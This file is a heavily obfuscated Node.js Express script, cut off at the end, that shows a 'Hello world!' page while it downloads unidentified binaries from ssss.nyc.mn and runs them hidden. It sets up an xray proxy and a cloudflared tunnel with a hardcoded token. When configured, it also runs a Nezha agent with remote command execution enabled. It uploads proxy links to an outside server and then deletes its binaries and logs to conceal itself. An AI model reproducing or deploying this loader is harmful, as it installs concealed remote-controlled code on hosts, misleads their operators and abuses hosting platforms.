const _0x3467d1=_0x20b7;(function(_0x171a55,_0x35f99a){const _0xe0deb=_0x20b7,_0x2db23e=_0x171a55();while(!![]){try{const _0x374291=parseInt(_0xe0deb(0x1a6))/0x1+parseInt(_0xe0deb(0x1b5))/0x2*(-parseInt(_0xe0deb(0x189))/0x3)+parseInt(_0xe0deb(0x19b))/0x4*(-parseInt(_0xe0deb(0x1c9))/0x5)+parseInt(_0xe0deb(0x240))/0x6+parseInt(_0xe0deb(0x202))/0x7*(parseInt(_0xe0deb(0x22a))/0x8)+parseInt(_0xe0deb(0x1fa))/0x9+-parseInt(_0xe0deb(0x1b3))/0xa*(-parseInt(_0xe0deb(0x1a7))/0xb);if(_0x374291===_0x35f99a)break;else _0x2db23e['push'](_0x2db23e['shift']());}catch(_0x2215ad){_0x2db23e['push'](_0x2db23e['shift']());}}}(_0x6f38,0x6173f));const express=require('express'),app=express(),axios=require(_0x3467d1(0x201)),os=require('os'),fs=require('fs'),path=require(_0x3467d1(0x1d2)),{promisify}=require(_0x3467d1(0x1b8)),exec=promisify(require(_0x3467d1(0x23f))['exec']),{execSync}=require(_0x3467d1(0x23f)),UPLOAD_URL=process[_0x3467d1(0x1bb)][_0x3467d1(0x224)]||'',PROJECT_URL=process[_0x3467d1(0x1bb)][_0x3467d1(0x20c)]||'',AUTO_ACCESS=process[_0x3467d1(0x1bb)][_0x3467d1(0x1f0)]||![],FILE_PATH=process[_0x3467d1(0x1bb)][_0x3467d1(0x21b)]||_0x3467d1(0x1cf),SUB_PATH=process[_0x3467d1(0x1bb)]['SUB_PATH']||_0x3467d1(0x199),PORT=process['env'][_0x3467d1(0x1c8)]||process[_0x3467d1(0x1bb)][_0x3467d1(0x22b)]||0xbb8,UUID=process['env'][_0x3467d1(0x1c3)]||_0x3467d1(0x1bd),NEZHA_SERVER=process[_0x3467d1(0x1bb)][_0x3467d1(0x247)]||'',NEZHA_PORT=process[_0x3467d1(0x1bb)][_0x3467d1(0x206)]||'',NEZHA_KEY=process[_0x3467d1(0x1bb)][_0x3467d1(0x1d4)]||'',ARGO_DOMAIN=process[_0x3467d1(0x1bb)][_0x3467d1(0x22c)]||_0x3467d1(0x1eb),ARGO_AUTH=process[_0x3467d1(0x1bb)][_0x3467d1(0x1b7)]||_0x3467d1(0x20a),ARGO_PORT=process[_0x3467d1(0x1bb)][_0x3467d1(0x1d6)]||0x1f41,CFIP=process[_0x3467d1(0x1bb)][_0x3467d1(0x184)]||_0x3467d1(0x1e6),CFPORT=process[_0x3467d1(0x1bb)]['CFPORT']||0x1bb,NAME=process[_0x3467d1(0x1bb)][_0x3467d1(0x1ae)]||_0x3467d1(0x20e);function _0x6f38(){const _0x5888dc=['\x0a\x20\x20\x0avmess://','/vmess-argo','./tmp','/vless-argo','/api/add-subscriptions','path','match','NEZHA_KEY','catch','ARGO_PORT','\x0a\x20\x20\x0atrojan://','push','\x0aclient_secret:\x20','Download\x20','unlinkSync','\x20failed:\x20','.exe\x20>\x20nul\x202>&1','message','true','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','error','send','existsSync','Error\x20executing\x20command:\x20','floor','cdns.doon.eu.org','false','http\x20server\x20is\x20running\x20on\x20port:','status','\x20is\x20created','limin1113.limin4120.netlib.re\x20','createWriteStream','Error\x20downloading\x20files:','isFile','\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/delete-nodes','filter','nohup\x20','https://amd64.ssss.nyc.mn/v1','firefox','ARGO_DOMAIN:','tunnel.yml','5793012XupKEK','pipe','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','--tls','rm\x20-rf\x20','Empowerment\x20success\x20for\x20','clear','axios','5964KclEqY','arm64','Nodes\x20uploaded\x20successfully','unlink','NEZHA_PORT','unshift','https://amd64.ssss.nyc.mn/bot','mkdirSync','eyJhIjoiZWUwODBiOWM5MTc0Y2QyMDUzODFhYjc4ODE0ZmFkY2IiLCJ0IjoiYzUzZGFhNzAtZTc5Yi00OWYyLWFhNTItZDBhMmE3NDk5ZTAyIiwicyI6Ik9UZzBNR05oTkdNdE0yTXpOUzAwTlRBeExXRXpOemN0WVdJNVpERTVaVFUxTWpReSJ9','quic','PROJECT_URL','set','limin','\x20successfully','\x0a\x20\x20\x20\x20','chmod','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Hello\x20world!','Error\x20in\x20startserver:','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/web','forEach','/trojan-argo','config.json','post','FILE_PATH','Error\x20reading\x20boot.log:','split','&fp=firefox&type=ws&host=','freedom','blackhole','substring','/tunnel.yml\x20run','statSync','UPLOAD_URL','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel.json','\x20is\x20running','then','pkill\x20-f\x20\x22[','16kDSvIC','PORT','ARGO_DOMAIN','config.yaml','web\x20running\x20error:\x20','del\x20/f\x20/q\x20','listen','writeFileSync','?encryption=none&security=tls&sni=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','utf-8','\x0a\x20\x20credentials-file:\x20','stream','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','fileUrl','/api/add-nodes','tcp','win32','trojan','application/json','child_process','1555446lPSSxr','8443','close','includes','443','\x20-s\x20','arm','NEZHA_SERVER','all','CFIP','none','https://arm64.ssss.nyc.mn/agent','\x20>/dev/null\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','4443DMJZvH','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/v1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','base64','/vmess-argo?ed=2560','tls','fileName','test','Subscription\x20uploaded\x20successfully','2083','pop','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://amd64.ssss.nyc.mn/web','\x22\x20>\x20/dev/null\x202>&1','https://amd64.ssss.nyc.mn/agent','sub','https+local://8.8.8.8/dns-query','1852GffoST','2096','platform','basename','App\x20is\x20running','vless','get','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','readdirSync','127.0.0.1','101290hzrRKx','869rlxYaS','data','http','?security=tls&sni=','map','vmess','trim','NAME','automatic\x20access\x20task\x20added\x20successfully','stringify','join','from','41670eReUgv','length','548dFgGME','charAt','ARGO_AUTH','util','boot.log','log','env','\x20-p\x20','02f32106-1712-4cfb-a2be-31bca8bc1894','2087','ArgoDomain:','aarch64','TunnelSecret','php\x20running\x20error:\x20','UUID','toString','readFileSync','Unhandled\x20error\x20in\x20startserver:','taskkill\x20/f\x20/im\x20','SERVER_PORT','5725xJnsgy','response','\x0a\x20\x20tunnel:\x20','\x0avless://'];_0x6f38=function(){return _0x5888dc;};return _0x6f38();}!fs[_0x3467d1(0x1e3)](FILE_PATH)?(fs[_0x3467d1(0x209)](FILE_PATH),console[_0x3467d1(0x1ba)](FILE_PATH+_0x3467d1(0x1ea))):console[_0x3467d1(0x1ba)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x251a4d=_0x3467d1,_0xb6b81f=_0x251a4d(0x234);let _0x100219='';for(let _0x38d74e=0x0;_0x38d74e<0x6;_0x38d74e++){_0x100219+=_0xb6b81f[_0x251a4d(0x1b6)](Math[_0x251a4d(0x1e5)](Math['random']()*_0xb6b81f['length']));}return _0x100219;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x20b7(_0x47ae89,_0x18a9a4){const _0x6f3806=_0x6f38();return _0x20b7=function(_0x20b71e,_0x19b052){_0x20b71e=_0x20b71e-0x183;let _0x3718a2=_0x6f3806[_0x20b71e];return _0x3718a2;},_0x20b7(_0x47ae89,_0x18a9a4);}let npmPath=path[_0x3467d1(0x1b1)](FILE_PATH,npmName),phpPath=path[_0x3467d1(0x1b1)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3467d1(0x1b1)](FILE_PATH,botName),subPath=path[_0x3467d1(0x1b1)](FILE_PATH,'sub.txt'),listPath=path[_0x3467d1(0x1b1)](FILE_PATH,'list.txt'),bootLogPath=path[_0x3467d1(0x1b1)](FILE_PATH,_0x3467d1(0x1b9)),configPath=path[_0x3467d1(0x1b1)](FILE_PATH,_0x3467d1(0x219));function deleteNodes(){const _0x56b740=_0x3467d1;try{if(!UPLOAD_URL)return;if(!fs[_0x56b740(0x1e3)](subPath))return;let _0x186aa7;try{_0x186aa7=fs[_0x56b740(0x1c5)](subPath,'utf-8');}catch{return null;}const _0x3cad11=Buffer['from'](_0x186aa7,_0x56b740(0x18d))[_0x56b740(0x1c4)](_0x56b740(0x235)),_0x18916a=_0x3cad11[_0x56b740(0x21d)]('\x0a')[_0x56b740(0x1f4)](_0x550b66=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x56b740(0x191)](_0x550b66));if(_0x18916a[_0x56b740(0x1b4)]===0x0)return;return axios['post'](UPLOAD_URL+_0x56b740(0x1f3),JSON[_0x56b740(0x1b0)]({'nodes':_0x18916a}),{'headers':{'Content-Type':_0x56b740(0x23e)}})[_0x56b740(0x1d5)](_0x588da9=>{return null;}),null;}catch(_0xc0ffb4){return null;}}function cleanupOldFiles(){const _0x29e361=_0x3467d1;try{const _0x1c24bd=fs[_0x29e361(0x1a4)](FILE_PATH);_0x1c24bd[_0x29e361(0x217)](_0x52b1eb=>{const _0x5f57cc=_0x29e361,_0x22600a=path[_0x5f57cc(0x1b1)](FILE_PATH,_0x52b1eb);try{const _0x73246e=fs[_0x5f57cc(0x223)](_0x22600a);_0x73246e[_0x5f57cc(0x1ee)]()&&fs[_0x5f57cc(0x1db)](_0x22600a);}catch(_0x29a43c){}});}catch(_0x559404){}}app[_0x3467d1(0x1a1)]('/',function(_0x29b30b,_0x27df85){const _0x3b7a4f=_0x3467d1;_0x27df85[_0x3b7a4f(0x1e2)](_0x3b7a4f(0x213));});async function generateConfig(){const _0x26ba77=_0x3467d1,_0x31b9c6={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x26ba77(0x185)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x26ba77(0x1a0),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x26ba77(0x1d0),'dest':0xbba},{'path':_0x26ba77(0x1ce),'dest':0xbbb},{'path':_0x26ba77(0x218),'dest':0xbbc}]},'streamSettings':{'network':_0x26ba77(0x23b)}},{'port':0xbb9,'listen':_0x26ba77(0x1a5),'protocol':_0x26ba77(0x1a0),'settings':{'clients':[{'id':UUID}],'decryption':_0x26ba77(0x185)},'streamSettings':{'network':_0x26ba77(0x23b),'security':_0x26ba77(0x185)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x26ba77(0x1a0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x26ba77(0x185)},'streamSettings':{'network':'ws','security':_0x26ba77(0x185),'wsSettings':{'path':_0x26ba77(0x1d0)}},'sniffing':{'enabled':!![],'destOverride':[_0x26ba77(0x1a9),'tls',_0x26ba77(0x20b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x26ba77(0x1a5),'protocol':_0x26ba77(0x1ac),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x26ba77(0x1a9),_0x26ba77(0x18f),_0x26ba77(0x20b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x26ba77(0x1a5),'protocol':_0x26ba77(0x23d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x26ba77(0x185),'wsSettings':{'path':_0x26ba77(0x218)}},'sniffing':{'enabled':!![],'destOverride':[_0x26ba77(0x1a9),_0x26ba77(0x18f),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x26ba77(0x19a)]},'outbounds':[{'protocol':_0x26ba77(0x21f),'tag':'direct'},{'protocol':_0x26ba77(0x220),'tag':'block'}]};fs[_0x26ba77(0x231)](path[_0x26ba77(0x1b1)](FILE_PATH,_0x26ba77(0x219)),JSON[_0x26ba77(0x1b0)](_0x31b9c6,null,0x2));}function getSystemArchitecture(){const _0x9910d5=_0x3467d1,_0x12c402=os['arch']();return _0x12c402===_0x9910d5(0x246)||_0x12c402===_0x9910d5(0x203)||_0x12c402===_0x9910d5(0x1c0)?_0x9910d5(0x246):'amd';}function downloadFile(_0x34f17f,_0x524d5e,_0x4e255c){const _0x7a3431=_0x3467d1,_0x4ae5f4=_0x34f17f;!fs[_0x7a3431(0x1e3)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1cd256=fs[_0x7a3431(0x1ec)](_0x4ae5f4);axios({'method':_0x7a3431(0x1a1),'url':_0x524d5e,'responseType':_0x7a3431(0x237)})[_0x7a3431(0x228)](_0x5a2df8=>{const _0x27969d=_0x7a3431;_0x5a2df8[_0x27969d(0x1a8)][_0x27969d(0x1fb)](_0x1cd256),_0x1cd256['on']('finish',()=>{const _0x183ad0=_0x27969d;_0x1cd256[_0x183ad0(0x242)](),console[_0x183ad0(0x1ba)]('Download\x20'+path[_0x183ad0(0x19e)](_0x4ae5f4)+_0x183ad0(0x20f)),_0x4e255c(null,_0x4ae5f4);}),_0x1cd256['on']('error',_0x5c3c41=>{const _0x24fbe6=_0x27969d;fs[_0x24fbe6(0x205)](_0x4ae5f4,()=>{});const _0x2810eb=_0x24fbe6(0x1da)+path['basename'](_0x4ae5f4)+_0x24fbe6(0x1dc)+_0x5c3c41[_0x24fbe6(0x1de)];console[_0x24fbe6(0x1e1)](_0x2810eb),_0x4e255c(_0x2810eb);});})[_0x7a3431(0x1d5)](_0x2ea13a=>{const _0x58fdf1=_0x7a3431,_0xc203fe=_0x58fdf1(0x1da)+path[_0x58fdf1(0x19e)](_0x4ae5f4)+'\x20failed:\x20'+_0x2ea13a['message'];console['error'](_0xc203fe),_0x4e255c(_0xc203fe);});}async function downloadFilesAndRun(){const _0x2f322d=_0x3467d1,_0x1078ea=getSystemArchitecture(),_0x21e9b6=getFilesForArchitecture(_0x1078ea);if(_0x21e9b6[_0x2f322d(0x1b4)]===0x0){console['log'](_0x2f322d(0x195));return;}const _0xc68016=_0x21e9b6[_0x2f322d(0x1ab)](_0x58963b=>{return new Promise((_0x36dd3c,_0x33c257)=>{const _0x104cc5=_0x20b7;downloadFile(_0x58963b[_0x104cc5(0x190)],_0x58963b[_0x104cc5(0x239)],(_0x1874ad,_0x274a16)=>{_0x1874ad?_0x33c257(_0x1874ad):_0x36dd3c(_0x274a16);});});});try{await Promise[_0x2f322d(0x183)](_0xc68016);}catch(_0x3aa4d0){console[_0x2f322d(0x1e1)](_0x2f322d(0x1ed),_0x3aa4d0);return;}function _0x1dbbbd(_0x186ea0){const _0x34db57=_0x2f322d,_0x1ed8bd=0x1fd;_0x186ea0[_0x34db57(0x217)](_0x3cb275=>{const _0x635d53=_0x34db57;fs['existsSync'](_0x3cb275)&&fs[_0x635d53(0x211)](_0x3cb275,_0x1ed8bd,_0x1c96aa=>{const _0x18f238=_0x635d53;_0x1c96aa?console[_0x18f238(0x1e1)]('Empowerment\x20failed\x20for\x20'+_0x3cb275+':\x20'+_0x1c96aa):console[_0x18f238(0x1ba)](_0x18f238(0x1ff)+_0x3cb275+':\x20'+_0x1ed8bd[_0x18f238(0x1c4)](0x8));});});}const _0x4978a6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1dbbbd(_0x4978a6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x7e6f7a=NEZHA_SERVER[_0x2f322d(0x243)](':')?NEZHA_SERVER[_0x2f322d(0x21d)](':')[_0x2f322d(0x194)]():'',_0x5d0fa0=new Set([_0x2f322d(0x244),_0x2f322d(0x241),_0x2f322d(0x19c),_0x2f322d(0x1be),_0x2f322d(0x193),'2053']),_0x124f52=_0x5d0fa0['has'](_0x7e6f7a)?_0x2f322d(0x1df):_0x2f322d(0x1e7),_0x5868c5=_0x2f322d(0x1d9)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x124f52+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2f322d(0x231)](path[_0x2f322d(0x1b1)](FILE_PATH,_0x2f322d(0x22d)),_0x5868c5);const _0x2e82fd=_0x2f322d(0x1f5)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2e82fd),console['log'](phpName+_0x2f322d(0x227)),await new Promise(_0x3d03ba=>setTimeout(_0x3d03ba,0x3e8));}catch(_0x749c83){console['error'](_0x2f322d(0x1c2)+_0x749c83);}}else{let _0xa6e626='';const _0x1c7c34=[_0x2f322d(0x244),_0x2f322d(0x241),_0x2f322d(0x19c),'2087',_0x2f322d(0x193),'2053'];_0x1c7c34['includes'](NEZHA_PORT)&&(_0xa6e626=_0x2f322d(0x1fd));const _0x21eb0e=_0x2f322d(0x1f5)+npmPath+_0x2f322d(0x245)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f322d(0x1bc)+NEZHA_KEY+'\x20'+_0xa6e626+_0x2f322d(0x233);try{await exec(_0x21eb0e),console[_0x2f322d(0x1ba)](npmName+_0x2f322d(0x227)),await new Promise(_0x740936=>setTimeout(_0x740936,0x3e8));}catch(_0x5019ab){console[_0x2f322d(0x1e1)]('npm\x20running\x20error:\x20'+_0x5019ab);}}}else console['log'](_0x2f322d(0x1f1));const _0x325b35='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x325b35),console['log'](webName+'\x20is\x20running'),await new Promise(_0x4db619=>setTimeout(_0x4db619,0x3e8));}catch(_0x1f8ab2){console['error'](_0x2f322d(0x22e)+_0x1f8ab2);}if(fs[_0x2f322d(0x1e3)](botPath)){let _0x267b64;if(ARGO_AUTH[_0x2f322d(0x1d3)](/^[A-Z0-9a-z=]{120,250}$/))_0x267b64=_0x2f322d(0x212)+ARGO_AUTH;else ARGO_AUTH[_0x2f322d(0x1d3)](/TunnelSecret/)?_0x267b64=_0x2f322d(0x238)+FILE_PATH+_0x2f322d(0x222):_0x267b64='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2f322d(0x1fc)+ARGO_PORT;try{await exec(_0x2f322d(0x1f5)+botPath+'\x20'+_0x267b64+_0x2f322d(0x1ef)),console['log'](botName+_0x2f322d(0x227)),await new Promise(_0x5445ec=>setTimeout(_0x5445ec,0x7d0));}catch(_0x484e01){console['error'](_0x2f322d(0x1e4)+_0x484e01);}}await new Promise(_0x2f30d7=>setTimeout(_0x2f30d7,0x1388));}function getFilesForArchitecture(_0x24cf26){const _0x10c23e=_0x3467d1;let _0x100cd5;_0x24cf26===_0x10c23e(0x246)?_0x100cd5=[{'fileName':webPath,'fileUrl':_0x10c23e(0x216)},{'fileName':botPath,'fileUrl':_0x10c23e(0x18a)}]:_0x100cd5=[{'fileName':webPath,'fileUrl':_0x10c23e(0x196)},{'fileName':botPath,'fileUrl':_0x10c23e(0x208)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5d1d1a=_0x24cf26===_0x10c23e(0x246)?_0x10c23e(0x186):_0x10c23e(0x198);_0x100cd5[_0x10c23e(0x207)]({'fileName':npmPath,'fileUrl':_0x5d1d1a});}else{const _0x23a2bb=_0x24cf26===_0x10c23e(0x246)?_0x10c23e(0x18b):_0x10c23e(0x1f6);_0x100cd5[_0x10c23e(0x207)]({'fileName':phpPath,'fileUrl':_0x23a2bb});}}return _0x100cd5;}function argoType(){const _0x1a1608=_0x3467d1;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x1a1608(0x18c));return;}if(ARGO_AUTH['includes'](_0x1a1608(0x1c1))){fs['writeFileSync'](path[_0x1a1608(0x1b1)](FILE_PATH,_0x1a1608(0x226)),ARGO_AUTH);const _0x3ea8e5=_0x1a1608(0x1cb)+ARGO_AUTH[_0x1a1608(0x21d)]('\x22')[0xb]+_0x1a1608(0x236)+path[_0x1a1608(0x1b1)](FILE_PATH,'tunnel.json')+_0x1a1608(0x1a3)+ARGO_DOMAIN+_0x1a1608(0x1e0)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1a1608(0x231)](path['join'](FILE_PATH,_0x1a1608(0x1f9)),_0x3ea8e5);}else console[_0x1a1608(0x1ba)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x4fbe99=_0x3467d1;let _0x57b736;if(ARGO_AUTH&&ARGO_DOMAIN)_0x57b736=ARGO_DOMAIN,console[_0x4fbe99(0x1ba)](_0x4fbe99(0x1f8),_0x57b736),await _0x1407a3(_0x57b736);else try{const _0xf1029f=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x584360=_0xf1029f[_0x4fbe99(0x21d)]('\x0a'),_0xb4b329=[];_0x584360[_0x4fbe99(0x217)](_0x18f6a5=>{const _0xd46b95=_0x4fbe99,_0x408576=_0x18f6a5[_0xd46b95(0x1d3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x408576){const _0x55f312=_0x408576[0x1];_0xb4b329[_0xd46b95(0x1d8)](_0x55f312);}});if(_0xb4b329['length']>0x0)_0x57b736=_0xb4b329[0x0],console[_0x4fbe99(0x1ba)](_0x4fbe99(0x1bf),_0x57b736),await _0x1407a3(_0x57b736);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));async function _0xf4f0b5(){const _0x3f1d4c=_0x4fbe99;try{process['platform']===_0x3f1d4c(0x23c)?await exec(_0x3f1d4c(0x1c7)+botName+_0x3f1d4c(0x1dd)):await exec(_0x3f1d4c(0x229)+botName[_0x3f1d4c(0x1b6)](0x0)+']'+botName[_0x3f1d4c(0x221)](0x1)+_0x3f1d4c(0x197));}catch(_0x46b91d){}}_0xf4f0b5(),await new Promise(_0x40e262=>setTimeout(_0x40e262,0xbb8));const _0x4e660b=_0x4fbe99(0x1f2)+FILE_PATH+_0x4fbe99(0x1fc)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4e660b+_0x4fbe99(0x1ef)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x493736=>setTimeout(_0x493736,0xbb8)),await extractDomains();}catch(_0x260629){console[_0x4fbe99(0x1e1)](_0x4fbe99(0x1e4)+_0x260629);}}}catch(_0x325ea7){console[_0x4fbe99(0x1e1)](_0x4fbe99(0x21c),_0x325ea7);}async function _0x1407a3(_0x2c88c7){const _0x621bba=_0x4fbe99,_0x5ba4b3=execSync(_0x621bba(0x1a2),{'encoding':_0x621bba(0x235)}),_0x10e563=_0x5ba4b3[_0x621bba(0x1ad)](),_0x34176f=NAME?NAME+'-'+_0x10e563:_0x10e563;return new Promise(_0x33c2e1=>{setTimeout(()=>{const _0x21e40d=_0x20b7,_0x31de9b={'v':'2','ps':''+_0x34176f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x21e40d(0x185),'host':_0x2c88c7,'path':_0x21e40d(0x18e),'tls':'tls','sni':_0x2c88c7,'alpn':'','fp':_0x21e40d(0x1f7)},_0x4ba33e=_0x21e40d(0x1cc)+UUID+'@'+CFIP+':'+CFPORT+_0x21e40d(0x232)+_0x2c88c7+_0x21e40d(0x21e)+_0x2c88c7+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x34176f+_0x21e40d(0x1cd)+Buffer[_0x21e40d(0x1b2)](JSON[_0x21e40d(0x1b0)](_0x31de9b))[_0x21e40d(0x1c4)](_0x21e40d(0x18d))+_0x21e40d(0x1d7)+UUID+'@'+CFIP+':'+CFPORT+_0x21e40d(0x1aa)+_0x2c88c7+_0x21e40d(0x21e)+_0x2c88c7+_0x21e40d(0x188)+_0x34176f+_0x21e40d(0x210);console[_0x21e40d(0x1ba)](Buffer[_0x21e40d(0x1b2)](_0x4ba33e)[_0x21e40d(0x1c4)](_0x21e40d(0x18d))),fs['writeFileSync'](subPath,Buffer[_0x21e40d(0x1b2)](_0x4ba33e)[_0x21e40d(0x1c4)]('base64')),console['log'](FILE_PATH+_0x21e40d(0x215)),uploadNodes(),app[_0x21e40d(0x1a1)]('/'+SUB_PATH,(_0x5e69a6,_0x24b288)=>{const _0x20e4e3=_0x21e40d,_0x55d12b=Buffer[_0x20e4e3(0x1b2)](_0x4ba33e)[_0x20e4e3(0x1c4)](_0x20e4e3(0x18d));_0x24b288[_0x20e4e3(0x20d)]('Content-Type','text/plain;\x20charset=utf-8'),_0x24b288[_0x20e4e3(0x1e2)](_0x55d12b);}),_0x33c2e1(_0x4ba33e);},0x7d0);});}}async function uploadNodes(){const _0x583f92=_0x3467d1;if(UPLOAD_URL&&PROJECT_URL){const _0x2c26ac=PROJECT_URL+'/'+SUB_PATH,_0x595f95={'subscription':[_0x2c26ac]};try{const _0x56499f=await axios[_0x583f92(0x21a)](UPLOAD_URL+_0x583f92(0x1d1),_0x595f95,{'headers':{'Content-Type':_0x583f92(0x23e)}});return _0x56499f&&_0x56499f['status']===0xc8?(console['log'](_0x583f92(0x192)),_0x56499f):null;}catch(_0xb8cf2a){if(_0xb8cf2a[_0x583f92(0x1ca)]){if(_0xb8cf2a[_0x583f92(0x1ca)][_0x583f92(0x1e9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x583f92(0x1e3)](listPath))return;const _0x1e019a=fs[_0x583f92(0x1c5)](listPath,_0x583f92(0x235)),_0x4a9233=_0x1e019a[_0x583f92(0x21d)]('\x0a')[_0x583f92(0x1f4)](_0x4cdfae=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4cdfae));if(_0x4a9233['length']===0x0)return;const _0x144393=JSON[_0x583f92(0x1b0)]({'nodes':_0x4a9233});try{const _0x2e7a66=await axios[_0x583f92(0x21a)](UPLOAD_URL+_0x583f92(0x23a),_0x144393,{'headers':{'Content-Type':_0x583f92(0x23e)}});return _0x2e7a66&&_0x2e7a66[_0x583f92(0x1e9)]===0xc8?(console['log'](_0x583f92(0x204)),_0x2e7a66):null;}catch(_0x4a6f9b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x57414b=_0x20b7,_0xfce1f6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xfce1f6[_0x57414b(0x1d8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xfce1f6['push'](phpPath);process[_0x57414b(0x19d)]==='win32'?exec(_0x57414b(0x22f)+_0xfce1f6['join']('\x20')+'\x20>\x20nul\x202>&1',_0x4c3072=>{const _0x162621=_0x57414b;console[_0x162621(0x200)](),console[_0x162621(0x1ba)](_0x162621(0x19f)),console[_0x162621(0x1ba)](_0x162621(0x225));}):exec(_0x57414b(0x1fe)+_0xfce1f6[_0x57414b(0x1b1)]('\x20')+_0x57414b(0x187),_0x55e062=>{const _0x523690=_0x57414b;console[_0x523690(0x200)](),console[_0x523690(0x1ba)]('App\x20is\x20running'),console[_0x523690(0x1ba)](_0x523690(0x225));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x9e0c60=_0x3467d1;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x9e0c60(0x1ba)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5f06ff=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x9e0c60(0x23e)}});return console[_0x9e0c60(0x1ba)](_0x9e0c60(0x1af)),_0x5f06ff;}catch(_0x20a40f){return console[_0x9e0c60(0x1e1)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x20a40f[_0x9e0c60(0x1de)]),null;}}async function startserver(){const _0xbd759c=_0x3467d1;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x336b37){console[_0xbd759c(0x1e1)](_0xbd759c(0x214),_0x336b37);}}startserver()[_0x3467d1(0x1d5)](_0x50f4e0=>{const 